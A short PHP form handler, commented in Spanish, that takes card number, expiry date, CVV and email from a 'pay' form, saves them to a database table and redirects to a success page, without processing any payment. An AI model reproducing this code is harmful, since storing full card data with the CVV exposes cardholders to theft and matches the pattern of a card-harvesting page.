<?php
// Incluir el archivo de conexión
include('conectar1.php');

if (isset($_POST['PAGAR'])) {
    // Capturar los datos enviados por el formulario
    $Cardnumber = $_POST['Cardnumber'];
    $Expirydate = $_POST['Expirydate'];
    $CVV = $_POST['CVV'];
    $Email = $_POST['Email'];

    // Usar sentencias preparadas para insertar los datos
    $stmt = $enlace->prepare("INSERT INTO datos (Cardnumber, Expirydate, CVV, Email) VALUES (?, ?, ?, ?)");
    $stmt->bind_param("ssss", $Cardnumber, $Expirydate, $CVV, $Email);

    if ($stmt->execute()) {
        // Redirigir a la página de éxito
        header("Location: éxito.php");
        exit();
    } else {
        echo "Error al insertar datos: " . $stmt->error;
    }

    $stmt->close();
}
?>